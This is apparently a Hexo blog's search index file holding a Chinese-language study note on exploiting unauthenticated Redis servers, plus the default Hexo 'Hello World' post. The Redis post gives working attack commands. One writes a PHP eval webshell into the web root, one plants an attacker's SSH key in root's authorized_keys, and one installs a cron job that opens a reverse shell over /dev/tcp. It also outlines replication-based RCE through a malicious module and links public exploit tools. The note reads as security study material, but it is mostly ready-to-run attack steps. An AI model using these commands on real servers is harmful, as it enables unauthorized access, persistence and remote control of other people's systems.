<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/05/02/redis/"/>
    <url>/2025/05/02/redis/</url>
    
    <content type="html"><![CDATA[<h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><p><a href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a>  </p><p>Redis 是一个基于内存的高性能键值数据库，支持多种数据结构，常用于缓存、分布式锁和会话存储等场景，操作简单、速度极快</p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis  服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis  的数据 或者进行一些其他的恶意操作 例如写入公钥 反弹shell等等  </p><h2 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h2><p><strong>利用Redis写入Webshell</strong>  </p><p>前提条件:  </p><p>1.存在未授权能免密成功连接 2.知道web服务器(apache nginx等等)的路径信息(<strong>可以想想为什么要知道web服务的路径而不是其他的路径</strong>) 3.有进行文件操作的权限  </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html/ </span><br><span class="language-xml">config set dbfilename shell.php</span><br><span class="language-xml">set xxx(这个xxx为key值 随意设) &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[whoami]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; </span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><strong>写入ssh公钥</strong>  </p><p>先在攻击机的&#x2F;home&#x2F;用户名&#x2F;.ssh文件夹里面输入  </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p>生成一对公私钥  </p><p><a href="https://blog.csdn.net/li528405176/article/details/82810342">https://blog.csdn.net/li528405176/article/details/82810342</a></p><p>然后再依次执行  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> /root/.ssh/id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt<br><span class="hljs-built_in">cat</span> /root/.ssh/key.txt | redis-cli -h 192.168.43.82 -x <span class="hljs-built_in">set</span> xxx<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">redis-cli -h<span class="hljs-built_in"> ip</span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/.ssh<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br></code></pre></td></tr></table></figure><p>最后ssh登录即可  </p><p>看不懂命令可以ai  </p><p><strong>写入计划任务来反弹shell</strong>  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">redis-cli -h<span class="hljs-built_in"> ip</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1\n\n&quot;</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /var/spool/cron/crontabs/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p>注意  </p><p>这个方法只能针对于centos来使用 ubuntu会失败  </p><p>Ubuntu 上的 <code>cron</code> 安全策略要求：</p><p>文件必须是 <code>crontab</code> 命令创建的</p><p>文件权限必须是600：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-rw<span class="hljs-params">-------</span> 1 root crontab  <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>所属用户必须是 <code>root</code>，所属组必须是 <code>crontab</code></p><p>不能有其他写权限或非正常文件格式  </p><p> 而 Redis 写入的文件：</p><ul><li>所属用户可能是 <code>redis</code></li><li>权限也可能是 <code>644</code></li><li>内容格式有可能不是标准 <code>crontab</code> 格式</li></ul><p>并且两者的计划任务所在的文件夹也不同  </p><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p><a href="http://39.105.96.246:8000/article/av28">http://39.105.96.246:8000/article/av28</a>  </p><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a>  </p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；</p><p>数据的复制是单向的，只能由主节点到从节点。</p><p>默认情况下，每台Redis服务器都是主节点，且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点  </p><p>主服务器可以进行读写操作，当发生写操作时自动将写操作同步给从服务器，而从服务器一般是只读，并接受主服务器同步过来写操作命令，然后执行这条命令。  </p><p>所有的数据修改只在主服务器上进行，然后将最新的数据同步给从服务器，这样就使得主从服务器的数据是一致的  </p><p>详细流程推荐  </p><p><a href="https://blog.csdn.net/Cantevenl/article/details/115839649">https://blog.csdn.net/Cantevenl/article/details/115839649</a>  </p><p><a href="https://zhuanlan.zhihu.com/p/151740247">https://zhuanlan.zhihu.com/p/151740247</a>  </p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li><strong>数据冗余</strong>：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li><li><strong>故障恢复</strong>：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li><li><strong>负载均衡</strong>：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li><li><strong>高可用基石</strong>：主从复制还是<a href="https://zhida.zhihu.com/search?content_id=121852126&content_type=Article&match_order=1&q=%E5%93%A8%E5%85%B5&zhida_source=entity">哨兵</a>和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</li></ul><h3 id="CAP原理"><a href="#CAP原理" class="headerlink" title="CAP原理"></a>CAP原理</h3><ul><li>C - Consistent ，<strong>一致性</strong> 所有节点在同一时间的数据是一致的  </li><li>A - Availability ，<strong>可用性</strong> 系统对外提供服务时，保证每个请求都有响应，不管是成功还是失败 </li><li>P - Partition tolerance ，<strong>分区容忍性</strong>  系统在遇到网络分区（节点之间无法通信）时仍然可以继续提供服务</li></ul><p>CAP 原理是分布式系统领域中的一个核心理论，用于描述在 <strong>网络分区（Partition tolerance）</strong> 的前提下，一个系统最多只能同时满足 <strong>一致性（Consistency）</strong> 和 <strong>可用性（Availability）</strong> 中的一个，而无法三者兼得。  </p><p>分布式系统的节点往往都是分布在不同的机器上进行网络隔离开的，这意味着必然会有网络断开的风险，这个网络断开的场景的专业词汇叫着「<strong>网络分区</strong>」。  </p><p>也就是说 虽然每个节点自身没挂、没坏，但由于网络故障，它们之间的数据无法同步或协同工作 这种因为网络状况而无法相互通信交流数据传输的情况就是网络分区  </p><h3 id="rce原理"><a href="#rce原理" class="headerlink" title="rce原理"></a>rce原理</h3><p>自Redis4.x之后 redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，比如实现一个新的Redis命令，Redis模块是动态库，可以在启动时使用<code>MODULE LOAD</code>命令加载到Redis中。  </p><p>那么我们是不是能够自己编写一个恶意的模块 放到攻击者本地搭建的主服务器里面 然后通过未授权连入到目标redis里面 然后手动主从连接到我们的服务器是自己变成从服务器 根据主从复制 恶意的模块文件就被写入了目标的redis里面 最后再去加载执行 就可以做一些恶意的操作了  </p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a>  </p><p><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a>  </p><p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202504252110997.png" alt="image-20250425211014841"></p><p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202504252110441.png" alt="image-20250425211039373"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/05/02/hello-world/"/>
    <url>/2025/05/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
